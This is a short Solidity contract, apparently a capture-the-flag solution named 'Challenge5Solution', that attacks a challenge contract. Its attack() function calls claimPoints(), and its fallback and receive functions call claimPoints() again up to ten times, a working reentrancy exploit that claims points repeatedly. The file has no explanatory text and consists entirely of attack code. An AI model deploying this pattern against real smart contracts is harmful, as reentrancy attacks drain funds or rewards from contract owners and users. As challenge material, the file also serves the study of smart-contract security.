//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IChallenge5 {
    function claimPoints() external;
    function points(address) external view returns (uint256);
}

contract Challenge5Solution {
    IChallenge5 public challenge5;
    uint256 public counter;

    constructor(address _challenge5Address) {
        challenge5 = IChallenge5(_challenge5Address);
    }

    // Execute reentrancy attack
    function attack() external {
        counter = 0;
        challenge5.claimPoints();
    }

    // Reentrancy through fallback function
    fallback() external payable {
        counter++;
        if (counter < 10) {
            challenge5.claimPoints();
        }
    }

    receive() external payable {
        counter++;
        if (counter < 10) {
            challenge5.claimPoints();
        }
    }
}
